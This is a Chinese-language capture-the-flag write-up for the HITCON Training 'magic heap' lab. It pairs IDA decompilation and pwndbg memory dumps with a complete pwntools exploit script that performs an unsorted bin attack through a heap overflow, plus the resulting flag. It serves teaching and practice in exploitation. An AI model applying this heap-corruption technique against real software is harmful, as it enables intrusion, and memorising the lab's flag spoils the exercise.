> 题目来源：HITCON Training lab14 magic heap
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/1xtxgobatE9yWFKkEsL6JLg](https://pan.baidu.com/s/1xtxgobatE9yWFKkEsL6JLg)  密码: 44km
>
> --来自百度网盘超级会员V3的分享
>

# Linux环境
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605616691570-32a5a43e-415d-4f63-97f1-45316d431b63.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605616703220-0748e759-b9d4-4dbd-a4e8-b907caafdd03.png)

> 本机的libc版本为libc-2.23，Ubuntu版本为16.04.7
>

# 文件保护
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605616916536-9c3281fe-1699-4def-a3d3-843170e3b7da.png)

这个文件开启了Canary和NX保护，64位程序。

# IDA静态分析
将程序放入到IDA中分析一下：

## main函数
main函数主要是用来控制程序的流程，没有什么好说的，大致看一看就好。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf; // [rsp+0h] [rbp-10h]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();                                   // --------------------------------
                                                //        Magic Heap Creator       
                                                // --------------------------------
                                                //  1. Create a Heap               
                                                //  2. Edit a Heap                 
                                                //  3. Delete a Heap               
                                                //  4. Exit                        
                                                // --------------------------------
                                                // Your choice :
                                                // 
      read(0, &buf, 8uLL);
      v3 = atoi(&buf);
      if ( v3 != 3 )
        break;
      delete_heap();                            // 3、删除堆块
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )                            // 4、退出
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 4869 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();                               // cat flag
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();                            // 1、创建堆块
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();                              // 2、编辑堆块
    }
  }
}
```

## 1、create_heap函数（创建堆块）
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605661333081-9c5f87b7-ba07-46c2-b1b4-7edaab3e36ca.png)

这个函数主要是用来创建堆块并向堆块中写入内容的。

## 2、edit_heap函数（编辑堆块）（任意堆溢出）
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605663037313-6bfc0c3a-2ce1-4ca1-8445-756563e6a5bf.png)

从上述函数中我们可以看出，程序最多可以创建9个堆块，并且堆块是从0开始的。这里存在任意堆溢出。

## 3、delete_heap（删除堆块）
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605662289533-fe62b3be-5419-4bfc-abed-ce680491d9d4.png)

这个函数没有什么好说的，不存在UAF漏洞。

## 4、exit函数（退出程序）
输入4即可退出程序。

## 4869、l33t函数（cat flag）
这个函数可以get flag，调用它有一个要求：要使程序的magic全局变量大于4869。

使用unsortedbin attack可以将这里的值更改为一个超大值。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605662729967-24158473-26ec-4ccd-9583-08f9e0fb1c01.png)

# pwndbg动态调试
接下来我们使用gdb来调试一下程序，注意要结合IDA使用。

验证一下任意堆溢出的漏洞吧：

首先创建一个堆块，内容如下：

```powershell
pwndbg> r
Starting program: /home/ubuntu/Desktop/unsortedbin_attack/magicheap 
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :1
Size of Heap : 30
Content of heap:aaaaaaaa
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
```

来查看一下此时的内存情况：

```c
pwndbg> heap
Allocated chunk
Addr: 0x603000
Size: 0x00

pwndbg> x/16gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031 #chunk1
0x603010:	0x6161616161616161	0x000000000000000a
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000020fd1 #top_chunk
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

编辑这个堆块：

```c
pwndbg> c
Continuing.
2
Index :0
Size of Heap : 100
Content of heap : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Done !
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
```

再来看一下内存的情况：

```c
pwndbg> x/16gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031 
0x603010:	0x6161616161616161	0x6161616161616161
0x603020:	0x6161616161616161	0x6161616161616161
0x603030:	0x6161616161616161	0x0000000000020f0a
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面可以看出chunk1的内容已经溢出到top_chunk中。

此时全局变量heaparray和magic：

```c
pwndbg> x/16gx 0x6020E0
0x6020e0 <heaparray>:	0x0000000000603010	0x0000000000000000
    					#malloc_data_ptr
0x6020f0 <heaparray+16>:	0x0000000000000000	0x0000000000000000
0x602100 <heaparray+32>:	0x0000000000000000	0x0000000000000000
0x602110 <heaparray+48>:	0x0000000000000000	0x0000000000000000
0x602120 <heaparray+64>:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
0x602140:	0x0000000000000000	0x0000000000000000
0x602150:	0x0000000000000000	0x0000000000000000
pwndbg> x/20gx 0x6020C0
0x6020c0 <magic>:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0 <heaparray>:	0x0000000000603010	0x0000000000000000
0x6020f0 <heaparray+16>:	0x0000000000000000	0x0000000000000000
0x602100 <heaparray+32>:	0x0000000000000000	0x0000000000000000
0x602110 <heaparray+48>:	0x0000000000000000	0x0000000000000000
0x602120 <heaparray+64>:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
0x602140:	0x0000000000000000	0x0000000000000000
0x602150:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

当然，在第一次输入内容的时候，你也可以选择直接堆溢出，虽然程序会出现奇奇怪怪的问题：

```c
➜  unsortedbin_attack gdb magicheap 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from magicheap...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/unsortedbin_attack/magicheap 
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :1
Size of Heap : 20                    
Content of heap:aaaaaaaaaaaaaaaaaaaaa
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :Invalid Choice
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x8
 RDI  0x0
 RSI  0x7fffffffddc0 —▸ 0x7fffffff0a61 ◂— 0x0
 R8   0x7ffff7fd9700 ◂— 0x7ffff7fd9700
 R9   0xd
 R10  0x0
 R11  0x246
 R12  0x400790 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdeb0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddd0 —▸ 0x400d50 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb8 —▸ 0x400ca7 (main+115) ◂— lea    rax, [rbp - 0x10]
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb8 —▸ 0x400ca7 (main+115) ◂— lea    rax, [rbp - 0x10]
01:0008│ rsi  0x7fffffffddc0 —▸ 0x7fffffff0a61 ◂— 0x0
02:0010│      0x7fffffffddc8 ◂— 0xb8e52ff0b5629f00
03:0018│ rbp  0x7fffffffddd0 —▸ 0x400d50 (__libc_csu_init) ◂— push   r15
04:0020│      0x7fffffffddd8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffdde0 ◂— 0x1
06:0030│      0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/unsortedbin_attack/magicheap'
07:0038│      0x7fffffffddf0 ◂— 0x1f7ffcca0
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1           400ca7 main+115
   f 2     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x603020
Size: 0x20fe1

pwndbg> x/20gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000021
0x603010:	0x6161616161616161	0x6161616161616161
0x603020:	0x0000000061616161	0x0000000000020fe1
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

为了不让程序出现奇奇怪怪的问题，我们还是选择第一种堆溢出的方式。

# exp
## exp内容
> exp来自CTF-wiki
>

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


create_heap(0x20, "1111")  # 0 size=0x20=32
create_heap(0x80, "2222")  # 1 size=0x80=128
# in order not to merge into top chunk
create_heap(0x20, "3333")  # 2
#gdb.attach(r)
del_heap(1)
#gdb.attach(r)
magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
#gdb.attach(r)
create_heap(0x80, "4444")  #trigger unsorted bin attack
#gdb.attach(r)
r.recvuntil(":")
r.sendline("4869")
r.interactive()
```

> 由于在gdb附加payload调试时，堆的地址会随机化，因此这里我们使用程序直接运行时的地址来讲解。
>

## payload分析
```python
create_heap(0x20, "1111")  # 0 size=0x20=32
create_heap(0x80, "2222")  # 1 size=0x80=128
# in order not to merge into top chunk
create_heap(0x20, "3333")  # 2
```

首先创建了两个堆块，为了让第二个堆块在释放时放入到unsortedbin中，因此我们需要创建第三个堆块来将第二个堆块与top_chunk分隔开。

> 释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。
>

  执行payload之后的内存状况如下：

```python
pwndbg> x/40gx 0x1292000
0x603000:	0x0000000000000000	0x0000000000000031 #chunk1（index0）
0x603010:	0x0000000a31313131	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000091 #chunk2（index1）
0x603040:	0x0000000a32323232	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000031 #chunk3（index2）
0x6030d0:	0x0000000a33333333	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000020f11 top_chunk
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

```python
del_heap(1)
```

执行上述代码之后chunk2会放到unsortedbin中：

```python
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x603030 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603030 /* '00`' */
BK: 0x603030 ◂— 0x91
smallbins
empty
largebins
empty
pwndbg> 
```

此时堆块的状况：

```python
pwndbg> x/40gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031 #chunk1
0x603010:	0x0000000a31313131	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000091 #chunk2(unsortedbin)
0x603040:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000090	0x0000000000000030 #chunk3
0x6030d0:	0x0000000a33333333	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000020f11 #top_chunk
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00000000006030f0 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000603030 #unsortedbin
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000603030	0x00007ffff7dd1b88
pwndbg> 
```

```python
magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
'''
def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
'''
```

这里使用了程序中的堆溢出漏洞，溢出修改chunk2（unsortedbin）的fd指针，修改之后的内存如下：

```python
pwndbg> x/40gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031 #chunk1
0x603010:	0x6161616161616161	0x6161616161616161
0x603020:	0x6161616161616161	0x6161616161616161
0x603030:	0x0000000000000000	0x0000000000000091 #chunk2(unsortedbin)
0x603040:	0x0000000000000000	0x00000000006020b0
    		#fd指针被修改         #bk指针被修改
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000090	0x0000000000000030 #chunk3
0x6030d0:	0x0000000a33333333	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000020f11 #top_chunk
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00000000006030f0 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000603030 #unsortedbin
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000603030	0x00007ffff7dd1b88
pwndbg> 
```

unsortedbin如下：

```python
pwndbg> unsortedbin
unsortedbin
all [corrupted]
FD: 0x603030 —▸ 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
BK: 0x603030 ◂— 0x0
pwndbg> 
```

最后当我们创建一个属于unsortedbin大小的堆块时，就会让全局变量magic变为一个超大的值：

```python
pwndbg> x/40gx 0xf8d000
0x603000:	0x0000000000000000	0x0000000000000031 #chunk1
0x603010:	0x6161616161616161	0x6161616161616161
0x603020:	0x6161616161616161	0x6161616161616161
0x603030:	0x0000000000000000	0x0000000000000091 #chunk2(被malloc)
0x603040:	0x0000000a34343434	0x00000000006020b0 
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000090	0x0000000000000031 #chunk3
0x6030d0:	0x0000000a33333333	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000020f11 #top_chunk
0x603000:	0x0000000000000000	0x0000000000000000
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00000000006030f0 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000603030 #chunk2
0x7ffff7dd1b90 <main_arena+112>:	0x00000000006020b0	0x00007ffff7dd1b88
pwndbg> 
```

此时的全局变量magic：

```python
pwndbg> x/16gx 0x6020b0
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dd18e0	0x0000000000000000
0x6020c0 <magic>:	0x00007ffff7dd1b78	0x0000000000000000
    				#被覆盖为一个超大的数，其值为main_arena+88的地址
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0 <heaparray>:	0x0000000000603010	0x0000000000603040
0x6020f0 <heaparray+16>:	0x00000000006030d0	0x0000000000000000
0x602100 <heaparray+32>:	0x0000000000000000	0x0000000000000000
0x602110 <heaparray+48>:	0x0000000000000000	0x0000000000000000
0x602120 <heaparray+64>:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

当我们向程序输入4869时就可以getflag。

## debug-exp
```python
➜  unsortedbin_attack python exp.py 
[+] Starting local process './magicheap' argv=['./magicheap'] : pid 8851
[DEBUG] Received 0x115 bytes:
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xf bytes:
    'Size of Heap : '
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Received 0x10 bytes:
    'Content of heap:'
[DEBUG] Sent 0x5 bytes:
    '1111\n'
[DEBUG] Received 0x120 bytes:
    'SuccessFul\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xf bytes:
    'Size of Heap : '
[DEBUG] Sent 0x4 bytes:
    '128\n'
[DEBUG] Received 0x10 bytes:
    'Content of heap:'
[DEBUG] Sent 0x5 bytes:
    '2222\n'
[DEBUG] Received 0x120 bytes:
    'SuccessFul\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xf bytes:
    'Size of Heap : '
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Received 0x10 bytes:
    'Content of heap:'
[DEBUG] Sent 0x5 bytes:
    '3333\n'
[DEBUG] Received 0x120 bytes:
    'SuccessFul\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x7 bytes:
    'Index :'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x11c bytes:
    'Done !\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x7 bytes:
    'Index :'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0xf bytes:
    'Size of Heap : '
[DEBUG] Sent 0x3 bytes:
    '64\n'
[DEBUG] Received 0x12 bytes:
    'Content of heap : '
[DEBUG] Sent 0x41 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
    00000030  00 00 00 00  00 00 00 00  b0 20 60 00  00 00 00 00  │····│····│· `·│····│
    00000040  0a                                                  │·│
    00000041
[DEBUG] Received 0x240 bytes:
    'Done !\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :Invalid Choice\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Sent 0x4 bytes:
    '128\n'
[DEBUG] Received 0x1f bytes:
    'Size of Heap : Content of heap:'
[DEBUG] Sent 0x5 bytes:
    '4444\n'
[DEBUG] Sent 0x5 bytes:
    '4869\n'
[*] Switching to interactive mode
[DEBUG] Received 0x129 bytes:
    'SuccessFul\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :Congrt !\n'
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :Congrt !
[DEBUG] Received 0x12f bytes:
    'flag{unsorted_bin_attack}\n'
    '--------------------------------\n'
    '       Magic Heap Creator       \n'
    '--------------------------------\n'
    ' 1. Create a Heap               \n'
    ' 2. Edit a Heap                 \n'
    ' 3. Delete a Heap               \n'
    ' 4. Exit                        \n'
    '--------------------------------\n'
    'Your choice :'
flag{unsorted_bin_attack}
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :$  
```

